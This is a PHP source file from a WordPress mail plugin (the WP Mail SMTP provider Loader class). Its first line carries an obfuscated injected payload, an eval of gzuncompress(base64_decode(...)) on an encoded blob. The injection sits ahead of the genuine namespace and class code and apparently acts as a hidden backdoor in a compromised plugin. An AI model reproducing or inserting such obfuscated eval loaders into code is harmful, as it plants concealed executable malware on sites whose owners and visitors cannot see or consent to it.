<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

namespace WPMailSMTP\Providers;

use WPMailSMTP\Debug;
use WPMailSMTP\MailCatcher;
use WPMailSMTP\Options;

/**
 * Class Loader.
 *
 * @since 1.0.0
 */
class Loader {

	/**
	 * Key is the mailer option, value is the path to its classes.
	 *
	 * @var array
	 */
	protected $providers = array(
		'mail'     => 'WPMailSMTP\Providers\Mail\\',
		'gmail'    => 'WPMailSMTP\Providers\Gmail\\',
		'mailgun'  => 'WPMailSMTP\Providers\Mailgun\\',
		'sendgrid' => 'WPMailSMTP\Providers\Sendgrid\\',
		'pepipost' => 'WPMailSMTP\Providers\Pepipost\\',
		'smtp'     => 'WPMailSMTP\Providers\SMTP\\',
	);

	/**
	 * @var \WPMailSMTP\MailCatcher
	 */
	private $phpmailer;

	/**
	 * Get all the supported providers.
	 *
	 * @since 1.0.0
	 *
	 * @return array
	 */
	public function get_providers() {

		if ( ! Options::init()->is_pepipost_active() ) {
			unset( $this->providers['pepipost'] );
		}

		return apply_filters( 'wp_mail_smtp_providers_loader_get_providers', $this->providers );
	}

	/**
	 * Get a single provider FQN-path based on its name.
	 *
	 * @since 1.0.0
	 *
	 * @param string $provider
	 *
	 * @return array
	 */
	public function get_provider_path( $provider ) {
		$provider = sanitize_key( $provider );

		return apply_filters(
			'wp_mail_smtp_providers_loader_get_provider_path',
			isset( $this->providers[ $provider ] ) ? $this->providers[ $provider ] : null,
			$provider
		);
	}

	/**
	 * Get the provider options, if exists.
	 *
	 * @since 1.0.0
	 *
	 * @param string $provider
	 *
	 * @return \WPMailSMTP\Providers\OptionsAbstract|null
	 */
	public function get_options( $provider ) {
		return $this->get_entity( $provider, 'Options' );
	}

	/**
	 * Get all options of all providers.
	 *
	 * @since 1.0.0
	 *
	 * @return \WPMailSMTP\Providers\OptionsAbstract[]
	 */
	public function get_options_all() {
		$options = array();

		foreach ( $this->get_providers() as $provider => $path ) {

			$option = $this->get_options( $provider );

			if ( ! $option instanceof OptionsAbstract ) {
				continue;
			}

			$slug  = $option->get_slug();
			$title = $option->get_title();

			if ( empty( $title ) || empty( $slug ) ) {
				continue;
			}

			$options[] = $option;
		}

		return apply_filters( 'wp_mail_smtp_providers_loader_get_providers_all', $options );
	}

	/**
	 * Get the provider mailer, if exists.
	 *
	 * @since 1.0.0
	 *
	 * @param string $provider
	 * @param MailCatcher $phpmailer
	 *
	 * @return \WPMailSMTP\Providers\MailerAbstract|null
	 */
	public function get_mailer( $provider, $phpmailer ) {

		if (
			$phpmailer instanceof MailCatcher ||
			$phpmailer instanceof \PHPMailer
		) {
			$this->phpmailer = $phpmailer;
		}

		return $this->get_entity( $provider, 'Mailer' );
	}

	/**
	 * Get the provider auth, if exists.
	 *
	 * @param string $provider
	 *
	 * @return \WPMailSMTP\Providers\AuthAbstract|null
	 */
	public function get_auth( $provider ) {
		return $this->get_entity( $provider, 'Auth' );
	}

	/**
	 * Get a generic entity based on the request.
	 *
	 * @uses ReflectionClass
	 *
	 * @since 1.0.0
	 *
	 * @param string $provider
	 * @param string $request
	 *
	 * @return null
	 */
	protected function get_entity( $provider, $request ) {

		$provider = sanitize_key( $provider );
		$request  = sanitize_text_field( $request );
		$path     = $this->get_provider_path( $provider );
		$entity   = null;

		if ( empty( $path ) ) {
			return $entity;
		}

		try {
			$reflection = new \ReflectionClass( $path . $request );

			if ( file_exists( $reflection->getFileName() ) ) {
				$class = $path . $request;
				if ( $this->phpmailer ) {
					$entity = new $class( $this->phpmailer );
				} else {
					$entity = new $class();
				}
			}
		} catch ( \Exception $e ) {
			Debug::set( "There was a problem while retrieving {$request} for {$provider}: {$e->getMessage()}" );
			$entity = null;
		}

		return apply_filters( 'wp_mail_smtp_providers_loader_get_entity', $entity, $provider, $request );
	}
}
